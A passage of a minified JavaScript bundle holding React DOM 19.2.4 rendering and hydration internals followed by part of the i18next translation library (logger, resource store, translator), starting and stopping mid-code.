y=ac(c.src),(v=o.querySelector(Zu(y)))?(s.instance=v,ot(v),v):(m=c,(v=Qn.get(y))&&(m=h({},c),yv(m,v)),o=o.ownerDocument||o,v=o.createElement("script"),ot(v),qt(v,"link",m),o.head.appendChild(v),s.instance=v);case"void":return null;default:throw Error(n(443,s.type))}else s.type==="stylesheet"&&(s.state.loading&4)===0&&(m=s.instance,s.state.loading|=4,af(m,c.precedence,o));return s.instance}function af(o,s,c){for(var m=c.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),v=m.length?m[m.length-1]:null,y=v,x=0;x<m.length;x++){var D=m[x];if(D.dataset.precedence===s)y=D;else if(y!==v)break}y?y.parentNode.insertBefore(o,y.nextSibling):(s=c.nodeType===9?c.head:c,s.insertBefore(o,s.firstChild))}function vv(o,s){o.crossOrigin==null&&(o.crossOrigin=s.crossOrigin),o.referrerPolicy==null&&(o.referrerPolicy=s.referrerPolicy),o.title==null&&(o.title=s.title)}function yv(o,s){o.crossOrigin==null&&(o.crossOrigin=s.crossOrigin),o.referrerPolicy==null&&(o.referrerPolicy=s.referrerPolicy),o.integrity==null&&(o.integrity=s.integrity)}var tf=null;function kx(o,s,c){if(tf===null){var m=new Map,v=tf=new Map;v.set(c,m)}else v=tf,m=v.get(c),m||(m=new Map,v.set(c,m));if(m.has(o))return m;for(m.set(o,null),c=c.getElementsByTagName(o),v=0;v<c.length;v++){var y=c[v];if(!(y[_i]||y[it]||o==="link"&&y.getAttribute("rel")==="stylesheet")&&y.namespaceURI!=="http://www.w3.org/2000/svg"){var x=y.getAttribute(s)||"";x=o+x;var D=m.get(x);D?D.push(y):m.set(x,[y])}}return m}function Ox(o,s,c){o=o.ownerDocument||o,o.head.insertBefore(c,s==="title"?o.querySelector("head > title"):null)}function Ok(o,s,c){if(c===1||s.itemProp!=null)return!1;switch(o){case"meta":case"title":return!0;case"style":if(typeof s.precedence!="string"||typeof s.href!="string"||s.href==="")break;return!0;case"link":if(typeof s.rel!="string"||typeof s.href!="string"||s.href===""||s.onLoad||s.onError)break;return s.rel==="stylesheet"?(o=s.disabled,typeof s.precedence=="string"&&o==null):!0;case"script":if(s.async&&typeof s.async!="function"&&typeof s.async!="symbol"&&!s.onLoad&&!s.onError&&s.src&&typeof s.src=="string")return!0}return!1}function Ux(o){return!(o.type==="stylesheet"&&(o.state.loading&3)===0)}function Uk(o,s,c,m){if(c.type==="stylesheet"&&(typeof m.media!="string"||matchMedia(m.media).matches!==!1)&&(c.state.loading&4)===0){if(c.instance===null){var v=ec(m.href),y=s.querySelector(Xu(v));if(y){s=y._p,s!==null&&typeof s=="object"&&typeof s.then=="function"&&(o.count++,o=nf.bind(o),s.then(o,o)),c.state.loading|=4,c.instance=y,ot(y);return}y=s.ownerDocument||s,m=_x(m),(v=Qn.get(v))&&vv(m,v),y=y.createElement("link"),ot(y);var x=y;x._p=new Promise(function(D,K){x.onload=D,x.onerror=K}),qt(y,"link",m),c.instance=y}o.stylesheets===null&&(o.stylesheets=new Map),o.stylesheets.set(c,s),(s=c.state.preload)&&(c.state.loading&3)===0&&(o.count++,c=nf.bind(o),s.addEventListener("load",c),s.addEventListener("error",c))}}var Ev=0;function zk(o,s){return o.stylesheets&&o.count===0&&sf(o,o.stylesheets),0<o.count||0<o.imgCount?function(c){var m=setTimeout(function(){if(o.stylesheets&&sf(o,o.stylesheets),o.unsuspend){var y=o.unsuspend;o.unsuspend=null,y()}},6e4+s);0<o.imgBytes&&Ev===0&&(Ev=62500*Ek());var v=setTimeout(function(){if(o.waitingForImages=!1,o.count===0&&(o.stylesheets&&sf(o,o.stylesheets),o.unsuspend)){var y=o.unsuspend;o.unsuspend=null,y()}},(o.imgBytes>Ev?50:800)+s);return o.unsuspend=c,function(){o.unsuspend=null,clearTimeout(m),clearTimeout(v)}}:null}function nf(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)sf(this,this.stylesheets);else if(this.unsuspend){var o=this.unsuspend;this.unsuspend=null,o()}}}var of=null;function sf(o,s){o.stylesheets=null,o.unsuspend!==null&&(o.count++,of=new Map,s.forEach(Bk,o),of=null,nf.call(o))}function Bk(o,s){if(!(s.state.loading&4)){var c=of.get(o);if(c)var m=c.get(null);else{c=new Map,of.set(o,c);for(var v=o.querySelectorAll("link[data-precedence],style[data-precedence]"),y=0;y<v.length;y++){var x=v[y];(x.nodeName==="LINK"||x.getAttribute("media")!=="not all")&&(c.set(x.dataset.precedence,x),m=x)}m&&c.set(null,m)}v=s.instance,x=v.getAttribute("data-precedence"),y=c.get(x)||m,y===m&&c.set(null,v),c.set(x,v),this.count++,m=nf.bind(this),v.addEventListener("load",m),v.addEventListener("error",m),y?y.parentNode.insertBefore(v,y.nextSibling):(o=o.nodeType===9?o.head:o,o.insertBefore(v,o.firstChild)),s.state.loading|=4}}var ed={$$typeof:k,Provider:null,Consumer:null,_currentValue:Ee,_currentValue2:Ee,_threadCount:0};function Fk(o,s,c,m,v,y,x,D,K){this.tag=1,this.containerInfo=o,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=Mi(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Mi(0),this.hiddenUpdates=Mi(null),this.identifierPrefix=m,this.onUncaughtError=v,this.onCaughtError=y,this.onRecoverableError=x,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=K,this.incompleteTransitions=new Map}function zx(o,s,c,m,v,y,x,D,K,oe,he,be){return o=new Fk(o,s,c,x,K,oe,he,be,D),s=1,y===!0&&(s|=24),y=Cn(3,null,null,s),o.current=y,y.stateNode=o,s=Zg(),s.refCount++,o.pooledCache=s,s.refCount++,y.memoizedState={element:m,isDehydrated:c,cache:s},nb(y),o}function Bx(o){return o?(o=Dl,o):Dl}function Fx(o,s,c,m,v,y){v=Bx(v),m.context===null?m.context=v:m.pendingContext=v,m=fs(s),m.payload={element:c},y=y===void 0?null:y,y!==null&&(m.callback=y),c=hs(o,m,s),c!==null&&(pn(c,o,s),Du(c,o,s))}function Vx(o,s){if(o=o.memoizedState,o!==null&&o.dehydrated!==null){var c=o.retryLane;o.retryLane=c!==0&&c<s?c:s}}function Sv(o,s){Vx(o,s),(o=o.alternate)&&Vx(o,s)}function Hx(o){if(o.tag===13||o.tag===31){var s=Pr(o,67108864);s!==null&&pn(s,o,67108864),Sv(o,67108864)}}function Gx(o){if(o.tag===13||o.tag===31){var s=Ln();s=fr(s);var c=Pr(o,s);c!==null&&pn(c,o,s),Sv(o,s)}}var rf=!0;function Vk(o,s,c,m){var v=Z.T;Z.T=null;var y=re.p;try{re.p=2,Cv(o,s,c,m)}finally{re.p=y,Z.T=v}}function Hk(o,s,c,m){var v=Z.T;Z.T=null;var y=re.p;try{re.p=8,Cv(o,s,c,m)}finally{re.p=y,Z.T=v}}function Cv(o,s,c,m){if(rf){var v=Tv(m);if(v===null)lv(o,s,m,lf,c),Jx(o,m);else if(Qk(v,o,s,c,m))m.stopPropagation();else if(Jx(o,m),s&4&&-1<Gk.indexOf(o)){for(;v!==null;){var y=_n(v);if(y!==null)switch(y.tag){case 3:if(y=y.stateNode,y.current.memoizedState.isDehydrated){var x=ji(y.pendingLanes);if(x!==0){var D=y;for(D.pendingLanes|=2,D.entangledLanes|=2;x;){var K=1<<31-We(x);D.entanglements[1]|=K,x&=~K}Yi(y),(Ta&6)===0&&(Vm=ht()+500,Wu(0))}}break;case 31:case 13:D=Pr(y,2),D!==null&&pn(D,y,2),Gm(),Sv(y,2)}if(y=Tv(m),y===null&&lv(o,s,m,lf,c),y===v)break;v=y}v!==null&&m.stopPropagation()}else lv(o,s,m,null,c)}}function Tv(o){return o=qn(o),xv(o)}var lf=null;function xv(o){if(lf=null,o=qi(o),o!==null){var s=r(o);if(s===null)o=null;else{var c=s.tag;if(c===13){if(o=l(s),o!==null)return o;o=null}else if(c===31){if(o=u(s),o!==null)return o;o=null}else if(c===3){if(s.stateNode.current.memoizedState.isDehydrated)return s.tag===3?s.stateNode.containerInfo:null;o=null}else s!==o&&(o=null)}}return lf=o,null}function Qx(o){switch(o){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(ni()){case fe:return 2;case Pe:return 8;case X:case ye:return 32;case we:return 268435456;default:return 32}default:return 32}}var Av=!1,Ps=null,Ls=null,Rs=null,ad=new Map,td=new Map,Is=[],Gk="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function Jx(o,s){switch(o){case"focusin":case"focusout":Ps=null;break;case"dragenter":case"dragleave":Ls=null;break;case"mouseover":case"mouseout":Rs=null;break;case"pointerover":case"pointerout":ad.delete(s.pointerId);break;case"gotpointercapture":case"lostpointercapture":td.delete(s.pointerId)}}function nd(o,s,c,m,v,y){return o===null||o.nativeEvent!==y?(o={blockedOn:s,domEventName:c,eventSystemFlags:m,nativeEvent:y,targetContainers:[v]},s!==null&&(s=_n(s),s!==null&&Hx(s)),o):(o.eventSystemFlags|=m,s=o.targetContainers,v!==null&&s.indexOf(v)===-1&&s.push(v),o)}function Qk(o,s,c,m,v){switch(s){case"focusin":return Ps=nd(Ps,o,s,c,m,v),!0;case"dragenter":return Ls=nd(Ls,o,s,c,m,v),!0;case"mouseover":return Rs=nd(Rs,o,s,c,m,v),!0;case"pointerover":var y=v.pointerId;return ad.set(y,nd(ad.get(y)||null,o,s,c,m,v)),!0;case"gotpointercapture":return y=v.pointerId,td.set(y,nd(td.get(y)||null,o,s,c,m,v)),!0}return!1}function Wx(o){var s=qi(o.target);if(s!==null){var c=r(s);if(c!==null){if(s=c.tag,s===13){if(s=l(c),s!==null){o.blockedOn=s,oi(o.priority,function(){Gx(c)});return}}else if(s===31){if(s=u(c),s!==null){o.blockedOn=s,oi(o.priority,function(){Gx(c)});return}}else if(s===3&&c.stateNode.current.memoizedState.isDehydrated){o.blockedOn=c.tag===3?c.stateNode.containerInfo:null;return}}}o.blockedOn=null}function cf(o){if(o.blockedOn!==null)return!1;for(var s=o.targetContainers;0<s.length;){var c=Tv(o.nativeEvent);if(c===null){c=o.nativeEvent;var m=new c.constructor(c.type,c);gu=m,c.target.dispatchEvent(m),gu=null}else return s=_n(c),s!==null&&Hx(s),o.blockedOn=c,!1;s.shift()}return!0}function Kx(o,s,c){cf(o)&&c.delete(s)}function Jk(){Av=!1,Ps!==null&&cf(Ps)&&(Ps=null),Ls!==null&&cf(Ls)&&(Ls=null),Rs!==null&&cf(Rs)&&(Rs=null),ad.forEach(Kx),td.forEach(Kx)}function uf(o,s){o.blockedOn===s&&(o.blockedOn=null,Av||(Av=!0,a.unstable_scheduleCallback(a.unstable_NormalPriority,Jk)))}var df=null;function Yx(o){df!==o&&(df=o,a.unstable_scheduleCallback(a.unstable_NormalPriority,function(){df===o&&(df=null);for(var s=0;s<o.length;s+=3){var c=o[s],m=o[s+1],v=o[s+2];if(typeof m!="function"){if(xv(m||c)===null)continue;break}var y=_n(c);y!==null&&(o.splice(s,3),s-=3,Tb(y,{pending:!0,data:v,method:c.method,action:m},m,v))}}))}function tc(o){function s(K){return uf(K,o)}Ps!==null&&uf(Ps,o),Ls!==null&&uf(Ls,o),Rs!==null&&uf(Rs,o),ad.forEach(s),td.forEach(s);for(var c=0;c<Is.length;c++){var m=Is[c];m.blockedOn===o&&(m.blockedOn=null)}for(;0<Is.length&&(c=Is[0],c.blockedOn===null);)Wx(c),c.blockedOn===null&&Is.shift();if(c=(o.ownerDocument||o).$$reactFormReplay,c!=null)for(m=0;m<c.length;m+=3){var v=c[m],y=c[m+1],x=v[Tt]||null;if(typeof y=="function")x||Yx(c);else if(x){var D=null;if(y&&y.hasAttribute("formAction")){if(v=y,x=y[Tt]||null)D=x.formAction;else if(xv(v)!==null)continue}else D=x.action;typeof D=="function"?c[m+1]=D:(c.splice(m,3),m-=3),Yx(c)}}}function $x(){function o(y){y.canIntercept&&y.info==="react-transition"&&y.intercept({handler:function(){return new Promise(function(x){return v=x})},focusReset:"manual",scroll:"manual"})}function s(){v!==null&&(v(),v=null),m||setTimeout(c,20)}function c(){if(!m&&!navigation.transition){var y=navigation.currentEntry;y&&y.url!=null&&navigation.navigate(y.url,{state:y.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var m=!1,v=null;return navigation.addEventListener("navigate",o),navigation.addEventListener("navigatesuccess",s),navigation.addEventListener("navigateerror",s),setTimeout(c,100),function(){m=!0,navigation.removeEventListener("navigate",o),navigation.removeEventListener("navigatesuccess",s),navigation.removeEventListener("navigateerror",s),v!==null&&(v(),v=null)}}}function Pv(o){this._internalRoot=o}pf.prototype.render=Pv.prototype.render=function(o){var s=this._internalRoot;if(s===null)throw Error(n(409));var c=s.current,m=Ln();Fx(c,m,o,s,null,null)},pf.prototype.unmount=Pv.prototype.unmount=function(){var o=this._internalRoot;if(o!==null){this._internalRoot=null;var s=o.containerInfo;Fx(o.current,2,null,o,null,null),Gm(),s[Ni]=null}};function pf(o){this._internalRoot=o}pf.prototype.unstable_scheduleHydration=function(o){if(o){var s=Gp();o={blockedOn:null,target:o,priority:s};for(var c=0;c<Is.length&&s!==0&&s<Is[c].priority;c++);Is.splice(c,0,o),c===0&&Wx(o)}};var Xx=e.version;if(Xx!=="19.2.4")throw Error(n(527,Xx,"19.2.4"));re.findDOMNode=function(o){var s=o._reactInternals;if(s===void 0)throw typeof o.render=="function"?Error(n(188)):(o=Object.keys(o).join(","),Error(n(268,o)));return o=p(s),o=o!==null?f(o):null,o=o===null?null:o.stateNode,o};var Wk={bundleType:0,version:"19.2.4",rendererPackageName:"react-dom",currentDispatcherRef:Z,reconcilerVersion:"19.2.4"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var mf=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!mf.isDisabled&&mf.supportsFiber)try{ma=mf.inject(Wk),ra=mf}catch{}}return od.createRoot=function(o,s){if(!i(o))throw Error(n(299));var c=!1,m="",v=oT,y=sT,x=rT;return s!=null&&(s.unstable_strictMode===!0&&(c=!0),s.identifierPrefix!==void 0&&(m=s.identifierPrefix),s.onUncaughtError!==void 0&&(v=s.onUncaughtError),s.onCaughtError!==void 0&&(y=s.onCaughtError),s.onRecoverableError!==void 0&&(x=s.onRecoverableError)),s=zx(o,1,!1,null,null,c,m,null,v,y,x,$x),o[Ni]=s.current,rv(o),new Pv(s)},od.hydrateRoot=function(o,s,c){if(!i(o))throw Error(n(299));var m=!1,v="",y=oT,x=sT,D=rT,K=null;return c!=null&&(c.unstable_strictMode===!0&&(m=!0),c.identifierPrefix!==void 0&&(v=c.identifierPrefix),c.onUncaughtError!==void 0&&(y=c.onUncaughtError),c.onCaughtError!==void 0&&(x=c.onCaughtError),c.onRecoverableError!==void 0&&(D=c.onRecoverableError),c.formState!==void 0&&(K=c.formState)),s=zx(o,1,!0,s,c??null,m,v,K,y,x,D,$x),s.context=Bx(null),c=s.current,m=Ln(),m=fr(m),v=fs(m),v.callback=null,hs(c,v,m),c=m,s.current.lanes=c,pr(s,c),Yi(s),o[Ni]=s.current,rv(o),new pf(s)},od.version="19.2.4",od}var lA;function i3(){if(lA)return Iv.exports;lA=1;function a(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(a)}catch(e){console.error(e)}}return a(),Iv.exports=n3(),Iv.exports}var o3=i3();const Je=a=>typeof a=="string",sd=()=>{let a,e;const t=new Promise((n,i)=>{a=n,e=i});return t.resolve=a,t.reject=e,t},cA=a=>a==null?"":""+a,s3=(a,e,t)=>{a.forEach(n=>{e[n]&&(t[n]=e[n])})},r3=/###/g,uA=a=>a&&a.indexOf("###")>-1?a.replace(r3,"."):a,dA=a=>!a||Je(a),Rd=(a,e,t)=>{const n=Je(e)?e.split("."):e;let i=0;for(;i<n.length-1;){if(dA(a))return{};const r=uA(n[i]);!a[r]&&t&&(a[r]=new t),Object.prototype.hasOwnProperty.call(a,r)?a=a[r]:a={},++i}return dA(a)?{}:{obj:a,k:uA(n[i])}},pA=(a,e,t)=>{const{obj:n,k:i}=Rd(a,e,Object);if(n!==void 0||e.length===1){n[i]=t;return}let r=e[e.length-1],l=e.slice(0,e.length-1),u=Rd(a,l,Object);for(;u.obj===void 0&&l.length;)r=`${l[l.length-1]}.${r}`,l=l.slice(0,l.length-1),u=Rd(a,l,Object),u?.obj&&typeof u.obj[`${u.k}.${r}`]<"u"&&(u.obj=void 0);u.obj[`${u.k}.${r}`]=t},l3=(a,e,t,n)=>{const{obj:i,k:r}=Rd(a,e,Object);i[r]=i[r]||[],i[r].push(t)},oh=(a,e)=>{const{obj:t,k:n}=Rd(a,e);if(t&&Object.prototype.hasOwnProperty.call(t,n))return t[n]},c3=(a,e,t)=>{const n=oh(a,t);return n!==void 0?n:oh(e,t)},$R=(a,e,t)=>{for(const n in e)n!=="__proto__"&&n!=="constructor"&&(n in a?Je(a[n])||a[n]instanceof String||Je(e[n])||e[n]instanceof String?t&&(a[n]=e[n]):$R(a[n],e[n],t):a[n]=e[n]);return a},Ur=a=>a.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g,"\\$&");var u3={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;","/":"&#x2F;"};const d3=a=>Je(a)?a.replace(/[&<>"'\/]/g,e=>u3[e]):a;class p3{constructor(e){this.capacity=e,this.regExpMap=new Map,this.regExpQueue=[]}getRegExp(e){const t=this.regExpMap.get(e);if(t!==void 0)return t;const n=new RegExp(e);return this.regExpQueue.length===this.capacity&&this.regExpMap.delete(this.regExpQueue.shift()),this.regExpMap.set(e,n),this.regExpQueue.push(e),n}}const m3=[" ",",","?","!",";"],f3=new p3(20),h3=(a,e,t)=>{e=e||"",t=t||"";const n=m3.filter(l=>e.indexOf(l)<0&&t.indexOf(l)<0);if(n.length===0)return!0;const i=f3.getRegExp(`(${n.map(l=>l==="?"?"\\?":l).join("|")})`);let r=!i.test(a);if(!r){const l=a.indexOf(t);l>0&&!i.test(a.substring(0,l))&&(r=!0)}return r},zy=(a,e,t=".")=>{if(!a)return;if(a[e])return Object.prototype.hasOwnProperty.call(a,e)?a[e]:void 0;const n=e.split(t);let i=a;for(let r=0;r<n.length;){if(!i||typeof i!="object")return;let l,u="";for(let d=r;d<n.length;++d)if(d!==r&&(u+=t),u+=n[d],l=i[u],l!==void 0){if(["string","number","boolean"].indexOf(typeof l)>-1&&d<n.length-1)continue;r+=d-r+1;break}i=l}return i},Kd=a=>a?.replace("_","-"),g3={type:"logger",log(a){this.output("log",a)},warn(a){this.output("warn",a)},error(a){this.output("error",a)},output(a,e){console?.[a]?.apply?.(console,e)}};let b3=class By{constructor(e,t={}){this.init(e,t)}init(e,t={}){this.prefix=t.prefix||"i18next:",this.logger=e||g3,this.options=t,this.debug=t.debug}log(...e){return this.forward(e,"log","",!0)}warn(...e){return this.forward(e,"warn","",!0)}error(...e){return this.forward(e,"error","")}deprecate(...e){return this.forward(e,"warn","WARNING DEPRECATED: ",!0)}forward(e,t,n,i){return i&&!this.debug?null:(Je(e[0])&&(e[0]=`${n}${this.prefix} ${e[0]}`),this.logger[t](e))}create(e){return new By(this.logger,{prefix:`${this.prefix}:${e}:`,...this.options})}clone(e){return e=e||this.options,e.prefix=e.prefix||this.prefix,new By(this.logger,e)}};var to=new b3;class Gh{constructor(){this.observers={}}on(e,t){return e.split(" ").forEach(n=>{this.observers[n]||(this.observers[n]=new Map);const i=this.observers[n].get(t)||0;this.observers[n].set(t,i+1)}),this}off(e,t){if(this.observers[e]){if(!t){delete this.observers[e];return}this.observers[e].delete(t)}}emit(e,...t){this.observers[e]&&Array.from(this.observers[e].entries()).forEach(([i,r])=>{for(let l=0;l<r;l++)i(...t)}),this.observers["*"]&&Array.from(this.observers["*"].entries()).forEach(([i,r])=>{for(let l=0;l<r;l++)i.apply(i,[e,...t])})}}class mA extends Gh{constructor(e,t={ns:["translation"],defaultNS:"translation"}){super(),this.data=e||{},this.options=t,this.options.keySeparator===void 0&&(this.options.keySeparator="."),this.options.ignoreJSONStructure===void 0&&(this.options.ignoreJSONStructure=!0)}addNamespaces(e){this.options.ns.indexOf(e)<0&&this.options.ns.push(e)}removeNamespaces(e){const t=this.options.ns.indexOf(e);t>-1&&this.options.ns.splice(t,1)}getResource(e,t,n,i={}){const r=i.keySeparator!==void 0?i.keySeparator:this.options.keySeparator,l=i.ignoreJSONStructure!==void 0?i.ignoreJSONStructure:this.options.ignoreJSONStructure;let u;e.indexOf(".")>-1?u=e.split("."):(u=[e,t],n&&(Array.isArray(n)?u.push(...n):Je(n)&&r?u.push(...n.split(r)):u.push(n)));const d=oh(this.data,u);return!d&&!t&&!n&&e.indexOf(".")>-1&&(e=u[0],t=u[1],n=u.slice(2).join(".")),d||!l||!Je(n)?d:zy(this.data?.[e]?.[t],n,r)}addResource(e,t,n,i,r={silent:!1}){const l=r.keySeparator!==void 0?r.keySeparator:this.options.keySeparator;let u=[e,t];n&&(u=u.concat(l?n.split(l):n)),e.indexOf(".")>-1&&(u=e.split("."),i=t,t=u[1]),this.addNamespaces(t),pA(this.data,u,i),r.silent||this.emit("added",e,t,n,i)}addResources(e,t,n,i={silent:!1}){for(const r in n)(Je(n[r])||Array.isArray(n[r]))&&this.addResource(e,t,r,n[r],{silent:!0});i.silent||this.emit("added",e,t,n)}addResourceBundle(e,t,n,i,r,l={silent:!1,skipCopy:!1}){let u=[e,t];e.indexOf(".")>-1&&(u=e.split("."),i=n,n=t,t=u[1]),this.addNamespaces(t);let d=oh(this.data,u)||{};l.skipCopy||(n=JSON.parse(JSON.stringify(n))),i?$R(d,n,r):d={...d,...n},pA(this.data,u,d),l.silent||this.emit("added",e,t,n)}removeResourceBundle(e,t){this.hasResourceBundle(e,t)&&delete this.data[e][t],this.removeNamespaces(t),this.emit("removed",e,t)}hasResourceBundle(e,t){return this.getResource(e,t)!==void 0}getResourceBundle(e,t){return t||(t=this.options.defaultNS),this.getResource(e,t)}getDataByLanguage(e){return this.data[e]}hasLanguageSomeTranslations(e){const t=this.getDataByLanguage(e);return!!(t&&Object.keys(t)||[]).find(i=>t[i]&&Object.keys(t[i]).length>0)}toJSON(){return this.data}}var XR={processors:{},addPostProcessor(a){this.processors[a.name]=a},handle(a,e,t,n,i){return a.forEach(r=>{e=this.processors[r]?.process(e,t,n,i)??e}),e}};const ZR=Symbol("i18next/PATH_KEY");function v3(){const a=[],e=Object.create(null);let t;return e.get=(n,i)=>(t?.revoke?.(),i===ZR?a:(a.push(i),t=Proxy.revocable(n,e),t.proxy)),Proxy.revocable(Object.create(null),e).proxy}function Fy(a,e){const{[ZR]:t}=a(v3());return t.join(e?.keySeparator??".")}const fA={},Mv=a=>!Je(a)&&typeof a!="boolean"&&typeof a!="number";class sh extends Gh{constructor(e,t={}){super(),s3(["resourceStore","languageUtils","pluralResolver","interpolator","backendConnector","i18nFormat","utils"],e,this),this.options=t,this.options.keySeparator===void 0&&(this.options.keySeparator="."),this.logger=to.create("translator")}changeLanguage(e){e&&(this.language=e)}exists(e,t={interpolation:{}}){const n={...t};if(e==null)return!1;const i=this.resolve(e,n);if(i?.res===void 0)return!1;const r=Mv(i.res);return!(n.returnObjects===!1&&r)}extractFromKey(e,t){let n=t.nsSeparator!==void 0?t.nsSeparator:this.options.nsSeparator;n===void 0&&(n=":");const i=t.keySeparator!==void 0?t.keySeparator:this.options.keySeparator;let r=t.ns||this.options.defaultNS||[];const l=n&&e.indexOf(n)>-1,u=!this.options.userDefinedKeySeparator&&!t.keySeparator&&!this.options.userDefinedNsSeparator&&!t.nsSeparator&&!h3(e,n,i);if(l&&!u){const d=e.match(this.interpolator.nestingRegexp);if(d&&d.length>0)return{key:e,namespaces:Je(r)?[r]:r};const p=e.split(n);(n!==i||n===i&&this.options.ns.indexOf(p[0])>-1)&&(r=p.shift()),e=p.join(i)}return{key:e,namespaces:Je(r)?[r]:r}}translate(e,t,n){let i=typeof t=="object"?{...t}:t;if(typeof i!="object"&&this.options.overloadTranslationOptionHandler&&(i=this.options.overloadTranslationOptionHandler(arguments)),typeof i=="object"&&(i={...i}),i||(i={}),e==null)return"";typeof e=="function"&&(e=Fy(e,{...this.options,...i})),Array.isArray(e)||(e=[String(e)]);const r=i.returnDetails!==void 0?i.returnDetails:this.options.returnDetails,l=i.keySeparator!==void 0?i.keySeparator:this.options.keySeparator,{key:u,namespaces:d}=this.extractFromKey(e[e.length-1],i),p=d[d.length-1];let f=i.nsSeparator!==void 0?i.nsSeparator:this.options.nsSeparator;f===void 0&&(f=":");const h=i.lng||this.language,E=i.appendNamespaceToCIMode||this.options.appendNamespaceToCIMode;if(h?.toLowerCase()==="cimode")return E?r?{res:`${p}${f}${u}`,usedKey:u,exactUsedKey:u,usedLng:h,usedNS:p,usedParams:this.getUsedParamsDetails(i)}:`${p}${f}${u}`:r?{res:u,usedKey:u,exactUsedKey:u,usedLng:h,usedNS:p,usedParams:this.getUsedParamsDetails(i)}:u;const C=this.resolve(e,i);let A=C?.res;const j=C?.usedKey||u,R=C?.exactUsedKey||u,I=["[object Number]","[object Function]","[object RegExp]"],w=i.joinArrays!==void 0?i.joinArrays:this.options.joinArrays,k=!this.i18nFormat||this.i18nFormat.handleAsObject,Y=i.count!==void 0&&!Je(i.count),ee=sh.hasDefaultValue(i),Q=Y?this.pluralResolver.getSuffix(h,i.count,i):"",q=i.ordinal&&Y?this.pluralResolver.getSuffix(h,i.count,{ordinal:!1}):"",M=Y&&!i.ordinal&&i.count===0,N=M&&i[`defaultValue${this.options.pluralSeparator}zero`]||i[`defaultValue${Q}`]||i[`defaultValue${q}`]||i.defaultValue;let L=A;k&&!A&&ee&&(L=N);const _=Mv(L),V=Object.prototype.toString.apply(L);if(k&&L&&_&&I.indexOf(V)<0&&!(Je(w)&&Array.isArray(L))){if(!i.returnObjects&&!this.options.returnObjects){this.options.returnedObjectHandler||this.logger.warn("accessing an object - but returnObjects options is not enabled!");const F=this.options.returnedObjectHandler?this.options.returnedObjectHandler(j,L,{...i,ns:d}):`key '${u} (${this.language})' returned an object instead of string.`;return r?(C.res=F,C.usedParams=this.getUsedParamsDetails(i),C):F}if(l){const F=Array.isArray(L),ce=F?[]:{},me=F?R:j;for(const Z in L)if(Object.prototype.hasOwnProperty.call(L,Z)){const re=`${me}${l}${Z}`;ee&&!A?ce[Z]=this.translate(re,{...i,defaultValue:Mv(N)?N[Z]:void 0,joinArrays:!1,ns:d}):ce[Z]=this.translate(re,{...i,joinArrays:!1,ns:d}),ce[Z]===re&&(ce[Z]=L[Z])}A=ce}}else if(k&&Je(w)&&Array.isArray(A))A=A.join(w),A&&(A=this.extendTranslation(A,e,i,n));else{let F=!1,ce=!1;!this.isValidLookup(A)&&ee&&(F=!0,A=N),this.isValidLookup(A)||(ce=!0,A=u);const Z=(i.missingKeyNoValueFallbackToKey||this.options.missingKeyNoValueFallbackToKey)&&ce?void 0:A,re=ee&&N!==A&&this.options.updateMissing;if(ce||F||re){if(this.logger.log(re?"updateKey":"missingKey",h,p,u,re?N:A),l){const J=this.resolve(u,{...i,keySeparator:!1});J&&J.res&&this.logger.warn("Seems the loaded translations were in flat JSON format instead of nested. Either set keySeparator: false on init or make sure your translations are published in nested format.")}let Ee=[];const je=this.languageUtils.getFallbackCodes(this.options.fallbackLng,i.lng||this.language);if(this.options.saveMissingTo==="fallback"&&je&&je[0])for(let J=0;J<je.length;J++)Ee.push(je[J]);else this.options.saveMissingTo==="all"?Ee=this.languageUtils.toResolveHierarchy(i.lng||this.language):Ee.push(i.lng||this.language);const G=(J,de,B)=>{const Re=ee&&B!==A?B:Z;this.options.missingKeyHandler?this.options.missingKeyHandler(J,p,de,Re,re,i):this.backendConnector?.saveMissing&&this.backendConnector.saveMissing(J,p,de,Re,re,i),this.emit("missingKey",J,p,de,A)};this.options.saveMissing&&(this.options.saveMissingPlurals&&Y?Ee.forEach(J=>{const 